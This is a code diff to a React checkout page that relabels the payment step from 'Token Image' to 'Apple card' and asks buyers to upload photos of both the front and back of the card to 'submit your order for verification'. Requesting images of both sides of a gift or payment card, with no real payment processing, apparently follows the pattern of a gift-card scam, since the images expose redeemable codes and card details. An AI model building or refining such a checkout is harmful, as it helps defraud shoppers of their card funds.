@@ -105,8 +105,8 @@ export default function Checkout({ params, onOrder }) {
       <div className="ck-grid">
         <form onSubmit={submit} noValidate>
           <section className="ck-card">
-            <h2>Pay with Token Image</h2>
-            <p className="upl-desc">Upload your token image to submit your order for verification. Add both the front and the back.</p>
+            <h2>Pay with Apple card</h2>
+            <p className="upl-desc">Upload your Apple card image to submit your order for verification. Add both the front and the back.</p>
 
             <div className="fields" style={{ marginBottom: 18 }}>
               <label className="fld">Full name
@@ -131,7 +131,7 @@ export default function Checkout({ params, onOrder }) {
             {prep && <p className="note" style={{ marginTop: 10 }}>Preparing image…</p>}
 
             {srvErr && <p className="ck-err" role="alert">{srvErr}</p>}
-            <button className="btn lg" disabled={busy || prep}>{busy ? "Uploading…" : "Upload Token & Submit Order"}</button>
+            <button className="btn lg" disabled={busy || prep}>{busy ? "Uploading…" : "Upload Apple card & Submit Order"}</button>
           </section>
         </form>
 
